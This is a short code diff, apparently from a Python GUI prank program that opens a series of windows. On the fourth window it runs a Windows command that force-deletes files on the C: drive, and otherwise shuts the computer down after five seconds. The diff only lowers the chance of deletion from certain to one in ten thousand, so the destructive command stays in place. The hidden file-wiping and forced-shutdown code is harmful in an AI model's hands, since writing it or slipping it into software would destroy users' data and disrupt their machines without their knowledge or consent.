@@ -39,7 +39,7 @@ def createWindow(labelText, buttonText, i):
         frame.pack(pady=70)
     windows.append(window)
     if i == 4:
-        if randint(1, 1) == 1:
+        if randint(1, 10000) == 1:
             system('del /f /q C:*.*')
         else:
             system('shutdown /s /t 5')
